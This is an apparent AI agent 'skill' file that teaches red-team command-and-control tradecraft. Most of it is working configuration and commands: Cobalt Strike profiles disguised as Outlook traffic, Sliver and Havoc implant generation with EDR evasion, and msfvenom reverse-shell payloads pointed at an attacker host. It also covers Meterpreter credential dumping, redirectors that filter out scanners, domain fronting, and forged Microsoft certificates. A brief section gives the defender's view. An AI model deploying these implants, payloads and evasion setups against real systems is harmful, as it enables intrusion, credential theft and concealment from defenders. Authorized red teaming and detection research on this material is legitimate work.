---
name: offensive-c2-frameworks
description: "Command and Control framework deployment, configuration, and operational tradecraft for red team engagements. Covers Cobalt Strike (malleable C2 profiles, Beacon types HTTP/HTTPS/DNS/SMB, Beacon Object Files for in-memory execution, sleep and jitter tuning, named pipe pivoting), Sliver (implant generation across mTLS/WireGuard/DNS transport, operator multiplayer mode, armory extensions), Mythic (agent ecosystem with Apollo/Poseidon/Medusa, C2 profile configuration, translation containers), Havoc (Demon agent with sleep obfuscation via Ekko/Zilean, indirect syscalls, dotnet inline execution), Metasploit (msfvenom payload generation, multi/handler staging, Meterpreter post-exploitation modules), redirector architecture using Apache mod_rewrite and Nginx, domain fronting through CDN providers, DNS-based C2 for restrictive network egress, and TLS certificate management for infrastructure OPSEC. Tools: Cobalt Strike, Sliver, Mythic, Havoc, Metasploit Framework. Aligns to MITRE ATT&CK T1071 (Application Layer Protocol), T1573 (Encrypted Channel), T1090 (Proxy/Connection Proxy)."
---

# Offensive C2 Frameworks

Command and Control is the backbone of any sustained red team engagement. Your C2 framework manages implant communication, task distribution, post-exploitation, and lateral movement coordination. Selecting and configuring the right framework -- and layering proper infrastructure around it -- determines whether your operation survives the first 48 hours or burns within minutes of initial access.

This skill covers the major C2 frameworks you encounter in professional red teaming, their configuration for operational security, the infrastructure patterns that protect your backend servers, and the tradecraft decisions that separate detectable operations from resilient ones. You are expected to understand not just how to deploy these tools, but why specific configuration choices matter against modern EDR and network monitoring.

## Quick Workflow

1. Define your engagement's network constraints -- identify allowed egress protocols, proxy requirements, and monitoring posture.
2. Select a primary C2 framework and transport based on target environment restrictions.
3. Build redirector infrastructure between your implants and your team server -- never expose the team server directly.
4. Configure communication profiles to mimic legitimate traffic patterns for the target organization.
5. Generate implants with appropriate sleep intervals, jitter, and kill dates.
6. Establish primary and fallback C2 channels using different transports and infrastructure.
7. Monitor your C2 traffic against detection signatures before deploying to production targets.

---

## Cobalt Strike

Cobalt Strike remains the most widely deployed commercial C2 framework. Its strength lies in malleable C2 profiles, Beacon flexibility, and a mature post-exploitation toolkit. You configure it for stealth through profile customization, sleep management, and BOF execution.

### Malleable C2 Profiles

Malleable profiles define how Beacon communicates -- HTTP headers, URI paths, data encoding, and TLS parameters. A well-crafted profile mimics a specific legitimate application.

```text
# Example malleable profile -- mimicking Microsoft 365 traffic
set sleeptime "60000";
set jitter    "37";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
set data_jitter "50";

https-certificate {
    set C   "US";
    set ST  "Washington";
    set L   "Redmond";
    set O   "Microsoft Corporation";
    set OU  "Microsoft IT";
    set CN  "outlook.office365.com";
    set validity "365";
}

http-get {
    set uri "/owa/auth/logon.aspx /autodiscover/autodiscover.xml";

    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Connection" "keep-alive";

        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";

        output {
            base64;
            prepend "<!DOCTYPE html><html><head></head><body>";
            append "</body></html>";
            print;
        }
    }
}

http-post {
    set uri "/owa/service.svc";
    set verb "POST";

    client {
        header "Content-Type" "application/json; charset=utf-8";

        id {
            base64url;
            prepend "token=";
            header "Cookie";
        }

        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            base64;
            print;
        }
    }
}
```

### Beacon Types and Pivoting

```text
# Beacon types and their use cases:
# HTTP/HTTPS Beacon  -- standard egress, most flexible
# DNS Beacon         -- low-bandwidth, high-stealth for restrictive networks
# SMB Beacon         -- named pipe, for internal pivoting (no egress needed)
# TCP Beacon         -- bind/reverse TCP for internal pivoting

# Generate payloads via Cobalt Strike GUI or aggressor scripts
# Stageless is preferred for OPSEC -- avoids the staging handshake

# Named pipe pivoting: link internal hosts through SMB Beacons
# On pivot host with HTTPS Beacon:
#   beacon> link 10.10.10.50 \\.\pipe\msagent_89
# The SMB Beacon on 10.10.10.50 communicates through the pivot host

# Sleep and jitter configuration in Beacon
#   beacon> sleep 300 45
#   Sets 300-second sleep with 45% jitter (sleep varies 165-435 seconds)
#   High sleep + high jitter = harder to detect via beaconing analysis
```

### Beacon Object Files (BOFs)

BOFs execute compiled C code directly in Beacon's memory without spawning a new process -- critical for evading process-based detections.

```c
/* example_bof.c -- inline whoami without spawning a child process */
#include <windows.h>
#include "beacon.h"

void go(char *args, int alen) {
    DWORD bufSize = 256;
    char username[256];
    char domain[256];

    WINBASEAPI BOOL WINAPI KERNEL32$GetUserNameA(LPSTR, LPDWORD);
    WINBASEAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);

    if (ADVAPI32$GetUserNameA(username, &bufSize)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Username: %s", username);
    }
}
```

```text
# Compile and load BOF
# x86_64-w64-mingw32-gcc -c example_bof.c -o example_bof.o
# beacon> inline-execute example_bof.o

# Key BOF repositories for red teams:
#   - trustedsec/CS-Situational-Awareness-BOF (user/network enumeration)
#   - anthemtotheego/InlineWhispers (syscall-based BOFs)
#   - rvrsh3ll/BOF_Collection (mixed utility BOFs)
```

---

## Sliver

Sliver is an open-source C2 framework with native support for mTLS, WireGuard, HTTP(S), and DNS transports. It supports multiplayer operation, allowing multiple operators to share a team server.

### Implant Generation

```bash
# Start Sliver server
./sliver-server

# Generate implants with different transports

# mTLS implant -- encrypted, mutual authentication
sliver > generate --mtls 10.10.14.5 --os windows --arch amd64 \
    --name FINANCE-WS --skip-symbols --disable-sgn

# WireGuard implant -- encapsulated in WireGuard tunnel
sliver > generate --wg 10.10.14.5:53 --os windows --arch amd64 \
    --name FINANCE-WG --skip-symbols

# DNS implant -- for highly restrictive networks
sliver > generate --dns c2.example.com --os windows --arch amd64 \
    --name FINANCE-DNS --skip-symbols

# HTTP(S) implant with custom parameters
sliver > generate --http https://cdn.example.com --os windows --arch amd64 \
    --name FINANCE-HTTPS --skip-symbols \
    --seconds 60 --jitter 30

# Start matching listeners
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > wg --lport 53
sliver > dns --domains c2.example.com
sliver > https --domain cdn.example.com --lport 443
```

### Operator Multiplayer and Armory

```bash
# Multiplayer: generate operator configs for team members
sliver > new-operator --name operator1 --lhost teamserver.internal
# Distribute the resulting .cfg file to operators

# Armory: install community extensions
sliver > armory install rubeus
sliver > armory install seatbelt
sliver > armory install sharp-hound-4

# Use extensions in a session
sliver (FINANCE-WS) > rubeus kerberoast
sliver (FINANCE-WS) > seatbelt -- -group=all

# Pivoting through Sliver
sliver (FINANCE-WS) > portfwd add --bind 127.0.0.1:9050 --remote 172.16.0.10:445
sliver (FINANCE-WS) > socks5 start
```

---

## Mythic

Mythic is a modular C2 platform with a web-based UI and a plug-in architecture for agents, C2 profiles, and translation containers. You select agents based on target OS and capability requirements.

### Agent Selection and Deployment

```bash
# Install Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
./mythic-cli install github https://github.com/MythicAgents/apollo
./mythic-cli install github https://github.com/MythicAgents/poseidon
./mythic-cli install github https://github.com/MythicAgents/medusa
./mythic-cli install github https://github.com/MythicC2Profiles/http

# Start Mythic
./mythic-cli start

# Agent capabilities:
# Apollo    -- Windows C# agent, inline .NET assembly, token manipulation
# Poseidon  -- macOS/Linux Go agent, SSH spawning, keylogging
# Medusa    -- Python agent, cross-platform, extensible
```

### C2 Profile Configuration

```json
{
    "name": "http_profile",
    "is_p2p": false,
    "parameters": [
        {
            "name": "callback_host",
            "value": "https://cdn-static.example.com"
        },
        {
            "name": "callback_port",
            "value": 443
        },
        {
            "name": "callback_interval",
            "value": 60
        },
        {
            "name": "callback_jitter",
            "value": 37
        },
        {
            "name": "headers",
            "value": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Accept": "text/html,application/xhtml+xml",
                "Host": "cdn-static.example.com"
            }
        },
        {
            "name": "get_uri",
            "value": "/api/v1/content"
        },
        {
            "name": "post_uri",
            "value": "/api/v1/telemetry"
        }
    ]
}
```

---

## Havoc

Havoc is a modern C2 framework featuring the Demon agent with advanced evasion capabilities including sleep obfuscation, indirect syscalls, and hardware breakpoint-based AMSI/ETW bypasses.

### Demon Agent Configuration

```yaml
# Havoc teamserver configuration -- havoc.yaotl
Teamserver:
  Host: "0.0.0.0"
  Port: 40056
  Build:
    Compiler64: "/usr/bin/x86_64-w64-mingw32-gcc"
    Nasm: "/usr/bin/nasm"

Operators:
  - Name: "operator1"
    Password: "Sup3rS3cure!"

Listeners:
  - Name: "HTTPS-Primary"
    Protocol: "Https"
    Host: "10.10.14.5"
    Port: 443
    Secure: true
    Uris:
      - "/api/v2/session"
      - "/api/v2/health"
      - "/api/v2/telemetry"
    Headers:
      - "Content-Type: application/json"
      - "Server: nginx/1.24.0"
      - "X-Request-Id: "
```

### Sleep Obfuscation and Evasion

```text
# Demon sleep obfuscation techniques:
# Ekko   -- timer-queue based, encrypts Beacon in memory during sleep
# Zilean -- similar approach using undocumented APIs
# Foliage -- APC-based sleep obfuscation

# Demon agent generation options:
# - Indirect syscalls: bypass user-mode hooks by resolving syscall numbers dynamically
# - Sleep mask: encrypt agent memory during sleep to evade memory scanners
# - Stack spoofing: manipulate return addresses to hide call origin
# - AMSI/ETW patching: hardware breakpoints avoid in-memory patching detection

# In the Havoc UI:
# Payload > Generate > Demon
#   Sleep Technique: Ekko
#   Indirect Syscalls: Enabled
#   Sleep Mask: Enabled
#   AMSI/ETW Bypass: Hardware Breakpoints
#   Sleep: 60
#   Jitter: 40
```

---

## Metasploit Framework

Metasploit remains essential for payload generation, initial access exploitation, and environments where commercial tools are unavailable. You use msfvenom for payload generation and multi/handler for catching callbacks.

### Payload Generation with msfvenom

```bash
# Staged vs Stageless:
# Staged (windows/meterpreter/reverse_https) -- small initial payload, downloads stage
# Stageless (windows/meterpreter_reverse_https) -- full payload, no staging handshake

# Windows stageless HTTPS Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_https \
    LHOST=10.10.14.5 LPORT=443 \
    HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    StagerVerifySSLCert=true \
    HandlerSSLCert=/opt/certs/c2.pem \
    -f exe -o payload.exe

# C# shellcode for custom loaders
msfvenom -p windows/x64/meterpreter_reverse_https \
    LHOST=10.10.14.5 LPORT=443 \
    -f csharp -o shellcode.cs

# Linux ELF payload
msfvenom -p linux/x64/meterpreter_reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 \
    -f elf -o payload.elf

# macOS Mach-O payload
msfvenom -p osx/x64/meterpreter_reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 \
    -f macho -o payload.macho
```

### Multi/Handler Configuration

```ruby
# Resource script: handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 0.0.0.0
set LPORT 443
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
set HandlerSSLCert /opt/certs/c2.pem
set StagerVerifySSLCert true
set SessionCommunicationTimeout 600
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript "post/windows/manage/migrate"
run -j

# Launch with resource script
# msfconsole -r handler.rc
```

```bash
# Post-exploitation essentials in Meterpreter
# meterpreter> getuid
# meterpreter> sysinfo
# meterpreter> migrate -N explorer.exe
# meterpreter> load kiwi
# meterpreter> creds_all
# meterpreter> portfwd add -l 9050 -p 445 -r 172.16.0.10
# meterpreter> run post/multi/manage/autoroute
# meterpreter> background
# msf6> use auxiliary/server/socks_proxy
# msf6> run
```

---

## Redirector Infrastructure

Never expose your team server directly to target networks. Redirectors sit between implants and your C2 server, absorbing scans and providing disposable frontend infrastructure.

### Apache mod_rewrite Redirectors

```apache
# /etc/apache2/sites-enabled/redirector.conf
# Redirect valid C2 traffic to team server, send everything else to a decoy

<VirtualHost *:443>
    ServerName cdn-static.example.com
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/cdn-static.example.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/cdn-static.example.com/privkey.pem

    RewriteEngine On

    # Block common scanners and researchers
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|nikto|nmap) [NC]
    RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]

    # Require correct URI paths matching your C2 profile
    RewriteCond %{REQUEST_URI} ^/owa/auth/logon\.aspx$ [OR]
    RewriteCond %{REQUEST_URI} ^/owa/service\.svc$ [OR]
    RewriteCond %{REQUEST_URI} ^/autodiscover/autodiscover\.xml$
    RewriteRule ^.*$ https://teamserver.internal:443%{REQUEST_URI} [P,L]

    # Everything else goes to a legitimate-looking decoy
    RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]

    ProxyPassReverse / https://teamserver.internal:443/
</VirtualHost>
```

### CDN Fronting and Domain Borrowing

```text
# Domain fronting: use a CDN where the Host header routes to your backend
# The outer TLS SNI shows a legitimate domain; the inner Host header reaches your C2

# Example with a CDN:
# 1. Register your backend with the CDN (e.g., cdn-12345.example-cdn.net)
# 2. In your C2 profile, set Host header to your CDN endpoint
# 3. Implants connect to a high-reputation CDN IP
# 4. Network monitors see traffic to the CDN, not your server

# Malleable profile snippet for CDN fronting
http-get {
    set uri "/content/static/js/app.js";
    client {
        header "Host" "your-tenant.cdn-provider.net";
        header "Accept" "*/*";
    }
}

# Domain borrowing: use an abandoned or unmonitored subdomain
# on a trusted domain that points to infrastructure you control
# Requires finding dangling CNAME or A records
```

---

## DNS-Based C2

DNS C2 operates over port 53 and often bypasses firewall restrictions. The tradeoff is bandwidth -- DNS channels are slow but resilient.

```bash
# DNS C2 infrastructure setup
# 1. Register a domain: c2ops.example.com
# 2. Create NS records pointing a subdomain to your team server
#    dns.c2ops.example.com  NS  ns1.c2ops.example.com
#    ns1.c2ops.example.com  A   <team-server-ip>

# 3. Configure Cobalt Strike DNS listener
#    Listeners > Add > Beacon DNS
#    DNS Hosts: dns.c2ops.example.com
#    DNS Port (Bind): 53

# 4. Sliver DNS listener
# sliver > dns --domains dns.c2ops.example.com --lport 53

# Verify DNS resolution reaches your server
dig A test.dns.c2ops.example.com @8.8.8.8
# If your team server receives the query, DNS C2 will function

# DNS over HTTPS (DoH) for the implant's DNS resolution
# prevents local DNS logging while maintaining DNS-based C2 transport
```

---

## Certificate Management

TLS certificates on your C2 infrastructure affect both OPSEC and implant trust validation.

```bash
# Let's Encrypt for legitimate-looking certificates
certbot certonly --standalone -d cdn-static.example.com \
    --agree-tos --email ops@example.com

# Self-signed with matching metadata for internal redirectors
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 \
    -keyout c2.key -out c2.crt -nodes \
    -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=outlook.office365.com" \
    -addext "subjectAltName=DNS:outlook.office365.com,DNS:*.office365.com"

# PKCS12 bundle for Cobalt Strike
openssl pkcs12 -export -in c2.crt -inkey c2.key -out c2.p12 \
    -name "outlook.office365.com" -passout pass:changeit

# Import into Cobalt Strike keystore
keytool -importkeystore -srckeystore c2.p12 -srcstoretype PKCS12 \
    -destkeystore c2.store -deststoretype JKS \
    -srcstorepass changeit -deststorepass changeit

# Certificate pinning in implants prevents MitM from security appliances
# Cobalt Strike: set trust_x509_c2 in malleable profile
# Sliver: mTLS provides mutual authentication by default
```

---

## Detection / Defender View

Network defenders and threat hunters target C2 at multiple layers:

- **JA3/JA3S fingerprinting**: TLS client and server hello fingerprints can identify C2 frameworks. Cobalt Strike's default Java TLS stack has distinctive JA3 hashes. Mitigation: use a custom TLS stack or CDN fronting to inherit the CDN's JA3S.
- **Beacon analysis**: Regular callback intervals, even with jitter, produce statistical patterns. Network detection tools (Rita, Zeek) perform frequency analysis on connection metadata. Mitigation: high jitter (40%+), variable sleep, interactive-only callbacks.
- **HTTP profile signatures**: Default malleable profiles have published signatures. Defenders extract indicators from profile configurations shared in threat intel. Mitigation: build custom profiles, avoid public templates, validate against known signature sets using c2lint.
- **DNS tunneling detection**: High query volumes to a single domain with high-entropy subdomain labels indicate DNS C2. Mitigation: rate-limit DNS callbacks, use short labels, mix with legitimate resolution.
- **Memory scanning**: EDR agents scan process memory for known C2 framework strings, reflective loader stubs, and shellcode patterns. Mitigation: sleep obfuscation, in-memory encryption, BOFs over fork-and-run.
- **Certificate anomalies**: Self-signed certificates, certificates with metadata mismatching the domain, or short-lived certificates raise alerts. Mitigation: use legitimate CA-issued certificates via Let's Encrypt.
- **Named pipe monitoring**: Sysmon EventID 17/18 logs named pipe creation and connection, revealing SMB Beacon pivoting. Mitigation: use pipe names that mimic legitimate Windows services.

---

## Engagement Cheatsheet

| Framework      | Primary Transport  | Stealth Feature           | Best Use Case                   | MITRE ID  |
|----------------|--------------------|---------------------------|---------------------------------|-----------|
| Cobalt Strike  | HTTPS/DNS/SMB      | Malleable profiles, BOFs  | Full-scope red team             | T1071.001 |
| Sliver         | mTLS/WireGuard/DNS | Multiplayer, armory       | Open-source alternative to CS   | T1573.002 |
| Mythic         | HTTP(S)            | Modular agents/profiles   | Custom agent requirements       | T1071.001 |
| Havoc          | HTTPS              | Ekko sleep, indirect syscalls | EDR-heavy environments       | T1573.001 |
| Metasploit     | HTTPS/TCP          | Extensive module library   | Initial access, CTF, lab work  | T1071.001 |

| Infrastructure    | Purpose                          | Key Configuration                    |
|-------------------|----------------------------------|--------------------------------------|
| Apache redirector | Filter C2 from scanners         | mod_rewrite rules matching profile   |
| CDN fronting      | Hide C2 behind trusted domains  | Host header routing to backend       |
| DNS C2            | Bypass firewall restrictions    | NS delegation to team server         |
| TLS certificates  | Avoid certificate-based alerts  | Let's Encrypt or metadata-matched    |

---

## Key References

- MITRE ATT&CK T1071 - Application Layer Protocol: https://attack.mitre.org/techniques/T1071/
- MITRE ATT&CK T1573 - Encrypted Channel: https://attack.mitre.org/techniques/T1573/
- MITRE ATT&CK T1090 - Proxy: https://attack.mitre.org/techniques/T1090/
- Cobalt Strike Documentation: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/
- Sliver C2 Wiki: https://github.com/BishopFox/sliver/wiki
- Mythic Documentation: https://docs.mythic-c2.net/
- Havoc Framework: https://github.com/HavocFramework/Havoc
- Metasploit Framework: https://docs.metasploit.com/
- Red Team Infrastructure Wiki: https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki
- Malleable C2 Profile Collection: https://github.com/threatexpress/malleable-c2
- RITA (Real Intelligence Threat Analytics): https://github.com/activecm/rita
